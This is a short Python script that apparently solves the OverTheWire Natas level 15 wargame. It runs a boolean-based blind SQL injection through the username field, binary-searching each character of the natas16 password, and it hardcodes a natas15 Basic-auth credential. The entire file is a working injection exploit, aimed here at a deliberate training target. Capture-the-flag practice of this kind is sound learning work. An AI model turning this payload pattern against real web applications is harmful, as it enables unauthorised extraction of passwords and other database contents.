import requests
import base64
import time
passwd = ''
auth = 'Basic ' + base64.b64encode('natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
t = time.time()
for i in range(1,33):
	st = 48
	en = 122
	while(True):
		mid = (st + en) / 2
		Data = {'username':'natas16" and ascii(substring(password,'+ str(i) +',1))=' + str(mid)+'-- -'}
		r = requests.post("http://natas15.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
		if "exists" in r.text:
			passwd += chr(mid)
			print "Password: " + passwd
			break
		Data = {'username':'natas16" and ascii(substring(password,'+ str(i) +',1))>' + str(mid)+'-- -'}
		r = requests.post("http://natas15.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
		if "exists" in r.text:
			st = mid + 1
		else:
			en = mid - 1
		if mid < 48:
			print "Not found"
			break
print "Time: " + str(time.time() - t)		
			
